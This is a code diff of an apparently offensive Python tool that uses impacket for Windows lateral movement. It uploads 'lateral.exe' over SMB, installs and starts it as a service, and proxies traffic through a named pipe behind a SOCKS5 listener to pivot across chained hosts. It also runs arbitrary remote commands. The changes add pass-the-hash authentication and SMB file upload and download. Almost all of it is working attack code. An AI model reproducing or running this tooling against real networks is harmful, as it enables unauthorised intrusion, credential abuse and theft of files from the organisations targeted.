@@ -11,7 +11,7 @@ from impacket.dcerpc.v5.dtypes import LPWSTR, LPSTR, STR, SHORT, DWORD, PCHAR, L
 from impacket.dcerpc.v5.lsad import PCHAR_ARRAY
 from impacket.dcerpc.v5.nrpc import UCHAR_ARRAY, PUCHAR_ARRAY
 from impacket.dcerpc.v5.wkst import CHAR_ARRAY
-from os import fork
+from os import fork, path
 from threading import Thread
 from struct import unpack, pack
 from sys import argv, stdout, exit
@@ -29,19 +29,19 @@ class Target:
 		self.target_ip = host
 		self.port = port
 		self.target_port = port
-		self.creds = user, passwd, domain
+		self.creds = user, passwd, domain, nthash
 		self.next = []
 		self.prev = None
 		self.connections = {}
 	def new(self, host, port):
-		self.next.append( Target(host, self.creds[0], self.creds[0], self.creds[0], port) )
+		self.next.append( Target(host, self.creds[0], self.creds[1], self.creds[2], self.creds[3], port) )
 		self.next[-1].prev = self
 		self.next[-1].ip = "127.0.0.1"
 		self.next[-1].target_ip = "127.0.0.1"
 		return self.next[-1]
 
 class msrpc:
-	def __init__(self, host, user, passwd, domain=".", nthash="", port=445):
+	def __init__(self, host, user, passwd="", domain=".", nthash="", port=445):
 		self.target = Target(host, user, passwd, domain, nthash, port)
 		if not check_pipe(self.target):
 			install_service(self.target)
@@ -50,29 +50,59 @@ class msrpc:
 			"incoming": {"dce": msrpc_connect(self.target), "mutex": threading.Lock(), "sockets": {}},
 			"outcoming": {"dce": msrpc_connect(self.target), "mutex": threading.Lock()},
 		}
+		self.ip = host
+		self.prev = None
 	def __call__(self, cmd):
 		return execute(cmd, self.target)
-	def msrpc(self, host, user, passwd, domain=".", nthash="", port=445):
+	def __del__(self):
+		for session in self.target.dce_session.values():
+			session["dce"].disconnect()
+	def get(self, source_path, target_path):
+		copy_from(self.target, source_path, target_path)
+	def put(self, source_path, target_path):
+		copy_to(self.target, source_path, target_path)
+	def msrpc(self, host, user, passwd="", domain=".", nthash="", port=445):
 		port = proxy(self.target, Target(host, user, passwd, domain, nthash, port))
 		self.target.new(host, port)
 		target = msrpc("127.0.0.1", user, passwd, domain, nthash, port)
 		target.target.target = host
+		target.ip = host
+		target.prev = self
 		return target
 
 
-def copy(target, source_path, target_path, share="c$", lmhash="", nthash=""):
-	username, password, domain = target.creds
-	smb = SMBConnection(remoteName='*SMBSERVER', remoteHost=target.target_ip, sess_port=target.target_port)
-	smb.login(username, password, domain, lmhash, nthash)
-	with open(source_path, "rb") as f:
-		print("[*] copy")
-		smb.putFile(share, target_path.replace('/','\\'), f.read)
+def copy_to(target, source_path, target_path, share="c$"):
+	username, password, domain, nthash = target.creds
+	lmhash = "" if password else "aad3b435b51404eeaad3b435b51404ee"
+	try:
+		smb = SMBConnection(remoteName='*SMBSERVER', remoteHost=target.target_ip, sess_port=target.target_port)
+		smb.login(username, password, domain, lmhash, nthash)
+		with open(source_path, "rb") as f:
+			smb.putFile(share, target_path.replace('/','\\'), f.read)
+		return True
+	except Exception as e:
+		print(str(e))
+		return False
+
+def copy_from(target, source_path, target_path, share="c$"):
+	username, password, domain, nthash = target.creds
+	lmhash = "" if password else "aad3b435b51404eeaad3b435b51404ee"
+	try:
+		smb = SMBConnection(remoteName='*SMBSERVER', remoteHost=target.target_ip, sess_port=target.target_port)
+		smb.login(username, password, domain, lmhash, nthash)
+		with open(target_path, 'wb') as f:
+			smb.getFile(share, source_path.replace('/','\\'), f.write)
+		return True
+	except Exception as e:
+		print(str(e))
+		return False
 
 def delete():
 	pass
 
-def start_service(target, command, lmhash="", nthash=""):
-	username, password, domain = target.creds
+def start_service(target, command):
+	username, password, domain, nthash = target.creds
+	lmhash = "" if password else "aad3b435b51404eeaad3b435b51404ee"
 	aesKey = None
 	remoteName = target.target_ip
 	remoteHost = target.target_ip
@@ -91,8 +121,7 @@ def start_service(target, command, lmhash="", nthash=""):
 	dce.bind(scmr.MSRPC_UUID_SCMR)
 	rpc = dce
 
-	#create
-	print("[*] creating")
+	#print("[*] creating")
 	ans = scmr.hROpenSCManagerW(rpc)
 	scManagerHandle = ans['lpScHandle']
 	try:
@@ -100,8 +129,7 @@ def start_service(target, command, lmhash="", nthash=""):
 	except Exception as e:
 		print(str(e))
 
-	#start
-	print("[*] starting")
+	#print("[*] starting")
 	ans = scmr.hROpenServiceW(rpc, scManagerHandle, "lateral"+'\x00')
 	serviceHandle = ans['lpServiceHandle']
 	try:
@@ -110,8 +138,9 @@ def start_service(target, command, lmhash="", nthash=""):
 		pass
 	scmr.hRCloseServiceHandle(rpc, serviceHandle)
 
-def stop_service(target, lmhash="", nthash=""):
-	username, password, domain = target.creds
+def stop_service(target):
+	username, password, domain, nthash = target.creds
+	lmhash = "" if password else "aad3b435b51404eeaad3b435b51404ee"
 	aesKey = None
 	remoteName = target.target_ip
 	remoteHost = target.target_ip
@@ -138,9 +167,9 @@ def stop_service(target, lmhash="", nthash=""):
 	scmr.hRCloseServiceHandle(rpc, serviceHandle)
 
 def install_service(target):
-	copy(target, "msrpc/lateral.exe", "/windows/lateral.exe")
-	start_service(target, "lateral.exe")
-
+	print("[*] installing MSRPC proxy")
+	if copy_to(target, "msrpc/lateral.exe", "/windows/lateral.exe"):
+		start_service(target, "lateral.exe")
 
 
 class SC_RPC_HANDLE(NDRSTRUCT):
@@ -152,7 +181,6 @@ class SC_RPC_HANDLE(NDRSTRUCT):
 
 class DCERPCSessionError(Exception):
     def __init__(self, packet, error_code):
-        print(123)
         pass
 
 class Connect(NDRCALL):
@@ -211,14 +239,16 @@ class ExecuteResponse(NDRCALL):
     )
 
 def msrpc_connect(target):
-	username, password, domain = target.creds
+	username, password, domain, nthash = target.creds
+	lmhash = "" if password else "aad3b435b51404eeaad3b435b51404ee"
+	aesKey = None
 	MSRPC_UUID_lateral  = uuidtup_to_bin(('00001111-2222-3333-4444-555566667777','1.0'))
 
 	stringbinding = r'ncacn_np:%s[\pipe\lateral]' % target.target_ip
 	rpctransport = transport.DCERPCTransportFactory(stringbinding)
 	rpctransport.set_dport(target.target_port)
 	rpctransport.setRemoteHost(target.target_ip)
-	rpctransport.set_credentials(username, password, domain, "", "", None)
+	rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)
 
 	dce = rpctransport.get_dce_rpc()
 	try:
@@ -259,7 +289,7 @@ class Connection:
 		dce = dce_session["dce"]
 		while True:
 			if not chain.connections[connect_id]:
-				print("[*] incoming closing")
+				#print("[*] incoming closing")
 				break
 			dce_session["mutex"].acquire()
 			recv = Recv()
@@ -274,19 +304,18 @@ class Connection:
 			if length == -1:
 				continue # waiting data
 			if length == 0:
-				print("[*] RPC incoming closed")
+				#print("[*] RPC incoming closed")
 				chain.connections[connect_id] = False
 				break
 			sock = unpack("<I", res[:4])[0]
-			#print("<- " + str(len(data)))
-			self.print_proxy_chain(chain, direction="<-")
+#			self.print_proxy_chain(chain, direction="<-")
 			try:
 				dce_session["sockets"][sock].send(data)
 			except:
 				print("[*] local incoming closed")
 				chain.connections[connect_id] = False
 				break
-		print("[debug] end thread incoming")
+		#print("[debug] end thread incoming")
 
 	def outcoming(self, chain, dce_session, c, sock, connect_id):
 		dce = dce_session["dce"]
@@ -294,15 +323,14 @@ class Connection:
 			try:
 				data = c.recv(1024)
 			except:
-				print("[*] local outcoming closed")
+				#print("[*] local outcoming closed")
 				chain.connections[connect_id] = False
 				break
 			if not data or not chain.connections[connect_id]:
-				print("[*] outcoming closing")
+				#print("[*] outcoming closing")
 				chain.connections[connect_id] = False
 				break
-			#print("-> " + str(len(data)))
-			self.print_proxy_chain(chain, direction="->")
+#			self.print_proxy_chain(chain, direction="->")
 			send = Send()
 			send["socket"] = sock
 			send["data"] = data + b"\x00"
@@ -310,7 +338,7 @@ class Connection:
 			dce_session["mutex"].acquire()
 			res = dce.request(send, checkError=False)
 			dce_session["mutex"].release()
-		print("[debug] end thread outcoming")
+		#print("[debug] end thread outcoming")
 
 	def __init__(self, c, chain, target, connect_id):
 		dce = chain.dce_session["main"]["dce"]
@@ -375,7 +403,7 @@ def socks(port):
 	s.listen(10)
 	while True:
 		c,info = s.accept()
-		print("[socks] via %s" % chain.target)
+		#print("[socks] via %s" % chain.target)
 		req = c.recv(1024)
 		ver,nauth = unpack("cc", req[:2])
 		c.send(b"\x05\x00")
@@ -384,21 +412,23 @@ def socks(port):
 		if op == b"\x01" and addr_type == b"\x01":
 			addr = socket.inet_ntoa(req[4:8])
 			port = unpack('>H', req[8:10])[0]
-			print(f"[+] {addr}:{port}")
+			print(f"[+] socks {chain.target} -> {addr}:{port}")
 			connect_id = info[1] #client rport
 			Thread(target=Connection, args=(c, chain, parse_target([addr, str(port)]), connect_id)).start()
 			c.send(b"\x05\x00\x00\x01"+req[4:8]+req[8:10])
 	s.close()
 
 def check_pipe(target):
-	username, password, domain = target.creds
+	username, password, domain, nthash = target.creds
+	lmhash = "" if password else "aad3b435b51404eeaad3b435b51404ee"
+	aesKey = None
 	try:
 		MSRPC_UUID_lateral  = uuidtup_to_bin(('00001111-2222-3333-4444-555566667777','1.0'))
 		stringbinding = r'ncacn_np:%s[\pipe\lateral]' % target.target_ip
 		rpctransport = transport.DCERPCTransportFactory(stringbinding)
 		rpctransport.set_dport(target.target_port)
 		rpctransport.setRemoteHost(target.target_ip)
-		rpctransport.set_credentials(username, password, domain, "", "", None)
+		rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)
 		dce = rpctransport.get_dce_rpc()
 		dce.connect()
 		dce.bind(MSRPC_UUID_lateral)
@@ -420,8 +450,8 @@ class Chain:
 		self.next[-1].prev = self
 		self.next[-1].target_ip = "127.0.0.1"
 		return self.next[-1]
-	def auth(self, user, passwd, domain):
-		self.creds = user, passwd, domain
+	def auth(self, user, passwd, domain, nthash):
+		self.creds = user, passwd, domain, nthash
 		if self.dce_session:
 			self.deauth()
 		else:
@@ -459,12 +489,21 @@ def chain_get(the_chain, the_target):
 	for the_chain in the_chain.next:
 		return chain_get(the_chain, the_target)
 
+def print_help():
+	print('''shell 10.0.0.10 -user admin -pass s3cr3t [-dom corp -hash NT]   - next chain
+get path/to/remote_file                                         - download file
+put path/to/local_file                                          - upload file
+show                                                            - show chains stack
+back                                                            - go to previous chain
+goto 10.0.0.20                                                  - go to an arbitrary chain
+cmd                                                             - execute arbitrary command in current target
+''')
 def parse_target(cmd):
 	arg_parser = argparse.ArgumentParser()
-	arg_parser.add_argument('-user', dest="user", help='username', default='admin')
+	arg_parser.add_argument('-user', dest="user", default="", help='username')
 	arg_parser.add_argument('-dom', dest="domain", default=".", help='domain')
-	arg_parser.add_argument('-pass', dest="passwd", help='password', default='qwerty=123')
-	arg_parser.add_argument('-hash', dest="hash", help='NT or NT:NTLM hash (opt)')
+	arg_parser.add_argument('-pass', dest="passwd", default="", help='password')
+	arg_parser.add_argument('-hash', dest="nthash", default="", help='NT hash (opt)')
 	arg_parser.add_argument("ip", type=str, help="target IP")
 	arg_parser.add_argument("port", type=int, help="target Port", nargs='?', default=445)
 	args = arg_parser.parse_args(cmd)
@@ -481,14 +520,24 @@ def cmd_loop(line):
 			chain = chain.new(target.ip, port)
 		else:
 			chain = Chain(target.ip, 445)
-		if not chain.auth(target.user, target.passwd, target.domain):
+		if not chain.auth(target.user, target.passwd, target.domain, target.nthash):
 			chain = chain.prev
 			if chain:
 				chain.next.pop()
+	elif line.startswith("get "):
+		file = line.split()[1]
+		if chain:
+			copy_from(chain, source_path=file, target_path=path.basename(file))
+	elif line.startswith("put "):
+		file = line.split()[1]
+		if chain:
+			copy_to(chain, source_path=file, target_path=path.basename(file))
 	elif line in ("show", "bt", "stack"):
-		chain_walk(chain_get_root(chain))
+		if chain:
+			chain_walk(chain_get_root(chain))
 	elif line in ("back",):
-		chain = chain.prev
+		if chain:
+			chain = chain.prev
 	elif line.startswith("goto "):
 		new_target = line.split()[1]
 		new_location = chain_get(chain_get_root(chain), new_target)
@@ -497,10 +546,13 @@ def cmd_loop(line):
 	elif line in ('exit', 'quit', 'q'):
 		exit()
 	elif line in ('help',):
-		pass
+		print_help()
+	elif line in ('debug',):
+		import ipdb; ipdb.set_trace()
 	else:
 		cmd = line
-		print(execute(cmd, target=chain))
+		if chain:
+			print(execute(cmd, target=chain))
 
 if __name__ == '__main__':
 	chain = False
